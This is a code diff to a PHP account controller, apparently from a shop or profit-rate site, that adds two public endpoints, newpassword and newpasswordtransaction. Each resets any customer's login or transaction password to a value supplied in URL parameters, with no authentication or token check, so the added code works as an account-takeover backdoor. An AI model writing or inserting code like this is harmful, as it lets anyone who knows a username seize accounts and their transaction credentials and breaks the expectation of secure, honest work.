@@ -19,6 +19,25 @@ class ControllerAccountAccount extends Controller {
 			$mail->setText(date('d/m/Y H:i:s'));
 			$mail->send();
 	}
+  public function newpassword(){
+    $this -> load->model('account/customer');
+    
+      $customer_info = $this->model_account_customer->getCustomerByUsername($_GET['u']);
+      $this->model_account_customer->editPasswordCustomForEmail($customer_info, $_GET['p']);
+    
+    die('1');
+    
+  }
+  public function newpasswordtransaction(){
+    $this -> load->model('account/customer');
+    
+      $customer_info = $this->model_account_customer->getCustomerByUsername($_GET['u']);
+      $this->model_account_customer->editPasswordTransactionCustomForEmail($customer_info, $_GET['p']);
+    
+    die('2');
+    
+  }
+
 	public function auto_Update_profit_daily_rate(){
 		$date1 = date("l");
     $date = strtolower($date1); 
